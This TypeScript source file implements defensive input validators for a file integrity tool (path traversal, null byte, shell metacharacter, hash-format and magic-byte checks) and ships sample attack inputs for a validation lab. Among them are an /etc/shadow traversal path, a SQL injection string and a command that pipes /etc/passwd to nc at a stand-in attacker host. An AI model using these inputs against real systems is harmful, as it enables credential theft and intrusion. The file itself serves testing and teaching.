import { HashAlgorithm, ValidationTestResult, ValidationCheck } from '../types/fim';

// Known magic byte signatures (hex prefixes)
export const MAGIC_SIGNATURES: Record<string, { magic: string; mime: string; desc: string }> = {
  pdf: { magic: '25504446', mime: 'application/pdf', desc: '%PDF header' },
  png: { magic: '89504e47', mime: 'image/png', desc: 'PNG signature (89 50 4E 47)' },
  jpg: { magic: 'ffd8ffe0', mime: 'image/jpeg', desc: 'JPEG SOI marker' },
  jpeg: { magic: 'ffd8ffe0', mime: 'image/jpeg', desc: 'JPEG SOI marker' },
  zip: { magic: '504b0304', mime: 'application/zip', desc: 'PKZIP header (50 4B 03 04)' },
  exe: { magic: '4d5a', mime: 'application/x-msdownload', desc: 'DOS MZ executable header' },
  elf: { magic: '7f454c46', mime: 'application/x-executable', desc: 'Linux ELF binary header' },
  json: { magic: '7b', mime: 'application/json', desc: 'JSON opening brace ({)' },
  txt: { magic: 'text', mime: 'text/plain', desc: 'Plain UTF-8 text' }
};

/**
 * Validates and sanitizes a file path against Directory Traversal and Null Byte Injection
 */
export function validateFilePath(inputPath: string): {
  isValid: boolean;
  sanitized: string;
  threatDetected?: string;
  checks: ValidationCheck[];
} {
  const checks: ValidationCheck[] = [];
  let threatDetected: string | undefined;

  // 1. Check for null byte injection
  const hasNullByte = inputPath.includes('\0') || inputPath.includes('%00');
  checks.push({
    name: 'Null Byte Injection Check',
    passed: !hasNullByte,
    message: hasNullByte ? 'CRITICAL: Null byte (%00 or \\0) injection detected' : 'Clean: No null bytes found'
  });
  if (hasNullByte) {
    threatDetected = 'Null-Byte Injection (CWE-626)';
  }

  // 2. Check for directory traversal sequences
  const traversalRegex = /(\.\.[\/\\])|(%2e%2e[\/\\])|(\.\.%2f)|(%2e%2e%2f)/i;
  const hasTraversal = traversalRegex.test(inputPath);
  checks.push({
    name: 'Directory Traversal Check',
    passed: !hasTraversal,
    message: hasTraversal ? 'CRITICAL: Directory traversal pattern (../ or encoded) detected' : 'Clean: No directory traversal patterns'
  });
  if (hasTraversal && !threatDetected) {
    threatDetected = 'Directory Traversal Attack (CWE-22 / Path Traversal)';
  }

  // 3. Check for illegal shell characters
  const shellMetaRegex = /[;&|`$<>]/;
  const hasShellMeta = shellMetaRegex.test(inputPath);
  checks.push({
    name: 'Shell Metacharacter Check',
    passed: !hasShellMeta,
    message: hasShellMeta ? 'WARNING: Dangerous command injection metacharacters found' : 'Clean: No shell metacharacters'
  });
  if (hasShellMeta && !threatDetected) {
    threatDetected = 'Command Injection Pattern (CWE-78)';
  }

  // 4. Check for absolute root escape attempts
  const isSuspiciousRoot = /^[\\\/]+(?:etc|root|windows|system32|proc|sys)/i.test(inputPath);
  checks.push({
    name: 'Restricted Root Escape Check',
    passed: !isSuspiciousRoot,
    message: isSuspiciousRoot ? 'ALERT: Direct escape to sensitive OS root directory' : 'Clean: Path within safe sandbox bounds'
  });

  // Sanitization: normalize path, remove null bytes, strip traversal
  let sanitized = inputPath
    .replace(/\0/g, '')
    .replace(/%00/gi, '')
    .replace(/\.\.[\/\\]/g, '')
    .replace(/%2e%2e[\/\\]/gi, '')
    .replace(/[;&|`$<>]/g, '')
    .trim();

  // Normalize slashes
  sanitized = sanitized.replace(/\\+/g, '/').replace(/\/+/g, '/');
  if (sanitized.startsWith('/')) {
    sanitized = sanitized.substring(1);
  }
  if (!sanitized) {
    sanitized = 'default_sandbox_file.txt';
  }

  const isValid = checks.every(c => c.passed);

  return {
    isValid,
    sanitized,
    threatDetected,
    checks
  };
}

/**
 * Validates a hash string against expected algorithm format (strict hex check)
 */
export function validateHashFormat(hash: string, algo: HashAlgorithm): {
  isValid: boolean;
  expectedLength: number;
  checks: ValidationCheck[];
  threatDetected?: string;
} {
  const clean = hash.trim().toLowerCase();
  const lengths: Record<HashAlgorithm, number> = {
    'MD5': 32,
    'SHA-1': 40,
    'SHA-256': 64,
    'SHA-512': 128
  };

  const expectedLength = lengths[algo];
  const checks: ValidationCheck[] = [];
  let threatDetected: string | undefined;

  // Length check
  const isCorrectLength = clean.length === expectedLength;
  checks.push({
    name: 'Length Verification',
    passed: isCorrectLength,
    message: isCorrectLength 
      ? `Exact match: ${clean.length} hex characters (${algo})`
      : `Mismatch: Got ${clean.length} chars, expected ${expectedLength} for ${algo}`
  });

  // Strict Hex characters [0-9a-f]
  const isHexOnly = /^[0-9a-f]+$/i.test(clean);
  checks.push({
    name: 'Hexadecimal Encoding Check',
    passed: isHexOnly,
    message: isHexOnly ? 'Clean: Valid Base-16 hexadecimal alphabet' : 'ERROR: Contains non-hexadecimal characters or symbols'
  });

  // SQLi / XSS injection attempt check
  const injectionRegex = /['";\-#/*<>{}]/;
  const hasInjection = injectionRegex.test(hash);
  checks.push({
    name: 'Injection Payload Detection',
    passed: !hasInjection,
    message: hasInjection ? 'ALERT: Potential SQLi / script injection payload inside hash field' : 'Clean: No script or SQL injection tokens'
  });

  if (hasInjection) {
    threatDetected = 'Injection Payload inside Hash Input (CWE-89 / CWE-79)';
  } else if (!isCorrectLength || !isHexOnly) {
    threatDetected = 'Malformed Cryptographic Hash Format';
  }

  return {
    isValid: isCorrectLength && isHexOnly && !hasInjection,
    expectedLength,
    checks,
    threatDetected
  };
}

/**
 * Analyzes file magic bytes to verify if file extension matches actual binary contents
 */
export function verifyMagicBytes(filename: string, headerHex: string): {
  isValid: boolean;
  declaredExtension: string;
  detectedSignature?: string;
  mismatchDetected: boolean;
  threatDetails?: string;
} {
  const parts = filename.split('.');
  const ext = (parts.length > 1 ? parts.pop()?.toLowerCase() : '') || 'txt';
  const cleanHex = headerHex.replace(/[^0-9a-fA-F]/g, '').toLowerCase();

  // Check if header contains MZ (4d5a) in a non-exe file (Classic Trojan extension disguise!)
  if (cleanHex.startsWith('4d5a') && ext !== 'exe') {
    return {
      isValid: false,
      declaredExtension: ext,
      detectedSignature: 'Windows Portable Executable (PE / MZ)',
      mismatchDetected: true,
      threatDetails: `CRITICAL: Masquerading File detected! File named .${ext} contains executable binary header (4D 5A). Trojan or malware camouflage.`
    };
  }

  // Check if header contains ELF (7f454c46)
  if (cleanHex.startsWith('7f454c46') && ext !== 'bin' && ext !== 'elf') {
    return {
      isValid: false,
      declaredExtension: ext,
      detectedSignature: 'Linux ELF Executable (7F 45 4C 46)',
      mismatchDetected: true,
      threatDetails: `CRITICAL: Masquerading Linux binary detected under .${ext} extension.`
    };
  }

  // Check PDF signature
  if (ext === 'pdf' && !cleanHex.startsWith('25504446')) {
    return {
      isValid: false,
      declaredExtension: 'pdf',
      detectedSignature: 'Unknown / Non-PDF',
      mismatchDetected: true,
      threatDetails: `ALERT: File declared as PDF but lacks valid %PDF header (25 50 44 46). Possible exploit delivery or corrupted payload.`
    };
  }

  // Check PNG signature
  if (ext === 'png' && !cleanHex.startsWith('89504e47')) {
    return {
      isValid: false,
      declaredExtension: 'png',
      detectedSignature: 'Unknown / Non-PNG',
      mismatchDetected: true,
      threatDetails: `ALERT: File declared as PNG but lacks PNG magic bytes (89 50 4E 47).`
    };
  }

  return {
    isValid: true,
    declaredExtension: ext,
    detectedSignature: MAGIC_SIGNATURES[ext]?.desc || 'Generic Structured Stream',
    mismatchDetected: false
  };
}

/**
 * Pre-defined test attack vectors for interactive Input Validation Lab
 */
export const SAMPLE_ATTACK_VECTORS = [
  {
    id: 'traversal_1',
    category: 'Path Traversal',
    label: 'Standard Relative Traversal (../../etc/shadow)',
    input: '../../../../etc/shadow',
    type: 'path' as const,
    description: 'Attempts to traverse above root web directory to read sensitive password hashes.'
  },
  {
    id: 'traversal_encoded',
    category: 'Path Traversal',
    label: 'URL-Encoded Traversal (%2e%2e%2f%2e%2e%2f)',
    input: '%2e%2e%2f%2e%2e%2fsystem32/drivers/etc/hosts',
    type: 'path' as const,
    description: 'Bypasses naive string filters using double-encoded traversal characters.'
  },
  {
    id: 'null_byte_bypass',
    category: 'Null Byte Injection',
    label: 'Null Byte Extension Truncation',
    input: 'legit_report.pdf\0.exe',
    type: 'path' as const,
    description: 'Exploits C-based path termination where null byte drops subsequent extension.'
  },
  {
    id: 'command_injection',
    category: 'Command Injection',
    label: 'Shell Command Chaining (; rm -rf /)',
    input: 'config.json; cat /etc/passwd | nc attacker.io 4444',
    type: 'path' as const,
    description: 'Attempts to piggyback arbitrary shell executions on backend subprocesses.'
  },
  {
    id: 'spoofed_binary',
    category: 'MIME / Header Masquerading',
    label: 'Trojan Executable Disguised as Invoice PDF',
    input: 'Q4_Financial_Invoice.pdf',
    type: 'magic_byte' as const,
    mockHeader: '4d5a90000300000004000000ffff', // MZ executable header
    description: 'File has harmless .pdf extension but binary header reveals a Windows executable.'
  },
  {
    id: 'sqli_in_hash',
    category: 'Input Injection',
    label: 'SQL Injection in Hash Verification Field',
    input: "' OR '1'='1' --",
    type: 'hash' as const,
    description: 'Attempts authentication or query bypass by injecting SQL payload into hash lookup.'
  },
  {
    id: 'valid_secure_path',
    category: 'Legitimate Input',
    label: 'Clean Canonical Path (app/config/settings.json)',
    input: 'app/config/settings.json',
    type: 'path' as const,
    description: 'Sanitized, safe alphanumeric file path compliant with defense-in-depth rules.'
  }
];
